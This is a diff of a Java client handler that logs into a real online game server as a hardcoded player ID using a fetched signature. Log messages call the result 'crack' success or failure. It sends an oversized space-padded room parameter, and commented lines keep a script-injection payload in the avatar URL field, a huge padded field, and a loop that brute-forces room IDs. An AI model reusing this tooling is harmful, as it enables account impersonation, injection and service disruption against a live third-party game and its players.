@@ -7,6 +7,9 @@ import org.apache.logging.log4j.Logger;
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import java.util.HashMap;
+import java.util.Map;
+
 /**
  * some description
  *
@@ -16,35 +19,10 @@ import org.json.JSONObject;
 public class GameHandshakeSuccessHandler implements OnHandshakeSuccessHandler {
     private static final Logger LOGGER = LogManager.getLogger(GameHandshakeSuccessHandler.class);
     private GameClient gameClient;
-    private String signData;
-    private String openId;
+
 
     private OpenIdService service;
-    private String ip;
 
-    public String getIp() {
-        return ip;
-    }
-
-    public void setIp(String ip) {
-        this.ip = ip;
-    }
-
-    public String getOpenId() {
-        return openId;
-    }
-
-    public void setOpenId(String openId) {
-        this.openId = openId;
-    }
-
-    public String getSignData() {
-        return signData;
-    }
-
-    public void setSignData(String signData) {
-        this.signData = signData;
-    }
 
     public void init(GameClient client) {
         this.gameClient = client;
@@ -55,10 +33,24 @@ public class GameHandshakeSuccessHandler implements OnHandshakeSuccessHandler {
     public void onSuccess(PomeloClient client, JSONObject jsonObject) {
 
         this.gameClient.hearBeat();
-        // while (true) {
+        PlatformClient platformClient = new PlatformClient("https://lele8k.game1617.com", 16000);
         try {
+            //String openId = service.generateId();
+            String openId = "oxmtuw_GQXpDC5Ox9UhJxOBGznJM";
+            Map<String, Object> map = new HashMap<>();
+            map.put("group", "game80");
+            map.put("playerid", openId);
+            map.put("formid", "3");
+            // map.put("url", "https://lele8k.game1617.com/index.html?mo=80&n_vn=3005369640&nvilele8k=1198956096&d1lele8k=10");
+            map.put("url", "https://lele8k.game1617.com/?mo=80&n_vn=1662369640&nvilele8k=2656454532&d1lele8k=10&lele8k_co=021Tzn1w30&lele8k_co2=0IbY21YL3w3cmM0O0Tzn1i&7473=shsfx1");
+            com.alibaba.fastjson.JSONObject ret = platformClient.get4https("/newapiex/getws.aspx", map);
+            LOGGER.info("ret={}", ret);
+            String signData = ret.getString("signdata");
+            String ip = ret.getString("msg");
+            String connectIp = ret.getString("wsip2");
+
             JSONObject entity = new JSONObject();
-            String id = service.generateId();
+            // String id = service.generateId();
             //    entity.put("_id", id);
             //   entity.put("_id", "oxmtuw_GQXpDC5Ox9UhJxOBGznJM@ll2020");
             entity.put("_id", openId + "@ll2020");
@@ -74,8 +66,8 @@ public class GameHandshakeSuccessHandler implements OnHandshakeSuccessHandler {
             // entity.put("_id", "oxmtuw_GQXpDC5Ox9UhJxOBGznJM@ll2020");
 
             // entity.put("name", "鱼香Rose");
-            //  entity.put("name", "\\u963f\\u9f99");
-            entity.put("name", "\\u20\\u20\\u20\\u20\\u20");//名字可以改
+            entity.put("name", "\\u963f\\u9f99");
+            //entity.put("name", "\\u20\\u20\\u20\\u20\\u20");//名字可以改
             //  entity.put("name", "\\u20\u1be4\u2075\u1d4d\\u28\ud83d\udcad");
             //  entity.put("name", "\u963f\u9f99\\u20\u1be4\u2075\u1d4d\\u20\ud83d\udcad");
             //     entity.put("name", "鱼香Rose");
@@ -86,8 +78,8 @@ public class GameHandshakeSuccessHandler implements OnHandshakeSuccessHandler {
 //            for (int i = 0; i < 199999999; i++) {
 //                sb.append(" ");
 //            }
-//            //   String value = RandomStringUtils.randomAlphanumeric(99999999);
-//            String value = MessageFormat.format("https://thirdwx.qlogo.cn/mmopen/vi_32/{0}/132", sb.toString());
+//            String value = RandomStringUtils.randomAlphanumeric(9999);
+//            value = MessageFormat.format("https://thirdwx.qlogo.cn/mmopen/vi_32/{0}/132", value);
 //            entity.put("headurl", value);
 //                eval("("+req.query.input+")");
 //
@@ -105,19 +97,19 @@ public class GameHandshakeSuccessHandler implements OnHandshakeSuccessHandler {
             //   entity.put("headurl", "https://game.guanl.cn/router/common/exception.do?userId=0&detail=<script>xmlHttp = new XMLHttpRequest; xmlHttp.open('GET','https://game.guanl.cn/c.png',false); xmlHttp.send(); console.log(xmlHttp.responseText);</script>");
 
 
-            entity.put("headurl", "https://thirdwx.qlogo.cn/mmopen/vi_32/y6E5GpvgQicwocia23oqIibpWBqEbCgny2JGsrAaCK1xSSPQbCXOzBZjN9iboicCqnQ1SHB3943qYZHibSWqAUpHdZ4A1/132");
-            //  entity.put("headurl", "https://thirdwx.qlogo.cn/mmopen/vi_32/Q0j4TwGTfTIrj8pKz1TFag7p4jz5AB7eialLmxHLiaC4xv2jw05aDkJo5W6iarBnEahS0nBJt9DwI6F2dEicGsG2xA/132");
+            //  entity.put("headurl", "https://thirdwx.qlogo.cn/mmopen/vi_32/y6E5GpvgQicwocia23oqIibpWBqEbCgny2JGsrAaCK1xSSPQbCXOzBZjN9iboicCqnQ1SHB3943qYZHibSWqAUpHdZ4A1/132");
+            entity.put("headurl", "https://thirdwx.qlogo.cn/mmopen/vi_32/Q0j4TwGTfTIrj8pKz1TFag7p4jz5AB7eialLmxHLiaC4xv2jw05aDkJo5W6iarBnEahA6cOIgxyG8HTib7dg1G0YGQ/132");
 
 
-            entity.put("agentId", "341168");//这个可以改
+            entity.put("agentId", "454532");//这个可以改
             entity.put("formId", 3);
-            entity.put("verison", "151");//每次版本更新都要改
+            entity.put("verison", "155");//每次版本更新都要改
             entity.put("ip", ip);
             entity.put("dis", 0);
             entity.put("smslogon", 0);
             entity.put("protocol", "https://");
             entity.put("hostname", "lele8k.game1617.com");
-            entity.put("connectIP", "lele8k.game1617.com");
+            entity.put("connectIP", connectIp);
             //  entity.put("passname", "31376101647185013682");
 
 
@@ -131,29 +123,44 @@ public class GameHandshakeSuccessHandler implements OnHandshakeSuccessHandler {
                 JSONObject object = message.getBodyJson();
                 int code = object.getInt("code");
                 if (code == 200) {
-                    LOGGER.debug("user={}", object);
+                    LOGGER.info("user={}", object);
                     //  LOGGER.debug("破解成功 id={}", id);
 
                     int userId = object.getJSONObject("data").getJSONObject("player").getInt("userId");
+                    StringBuilder sb = new StringBuilder("979532");
 
-                    LOGGER.debug("userId={}", userId);
-                    gameClient.joinRoom(GameType.COMMON, 621740);
+                    for (int i = 0; i < 30999; i++) {
+                        sb.append(" ");
+                    }
+                    String other = sb.toString();
+                    LOGGER.info("userId={}", userId);
+                    //    for (int i = 0; i < 1000000; i++) {
+                    gameClient.asyncCreateRoom(GameType.COMMON, other);
+
+
+                    //   ThreadUtils.sleep(10);
+                    //   }
+
+                    // String prefix = "6217";
+//                    String prefix = "5115";
+//
+//                    for (int i = 10; i < 100; i++) {
+//                        if (!gameClient.isRoom()) {
+//                            int roomId = Integer.parseInt(prefix + i);
+//                            LOGGER.debug("尝试进入房间 roomId={}", roomId);
+//                            gameClient.joinRoom(GameType.COMMON, roomId);
+//                        } else {
+//                            break;
+//                        }
+//
+//                    }
+
+
+                    //  gameClient.joinRoom(GameType.COMMON, 621740);
                 } else {
-                    LOGGER.debug("破解失败 id={}", id);
+                    LOGGER.debug("破解失败 id={}", openId);
                 }
 
-
-//                String prefix = "1819";
-//                for (int i = 10; i < 100; i++) {
-//                    if (!gameClient.isRoom()) {
-//                        int roomId = Integer.parseInt(prefix + i);
-//                        LOGGER.debug("尝试进入房间 roomId={}", roomId);
-//                        gameClient.joinRoom(GameType.COMMON, roomId);
-//                    } else {
-//                        break;
-//                    }
-//
-//                }
 
                 //   gameClient.getUserInfo(373082);
                 //  flag = true;
@@ -166,7 +173,6 @@ public class GameHandshakeSuccessHandler implements OnHandshakeSuccessHandler {
 
         }
 
-        //   }
 
     }
 }
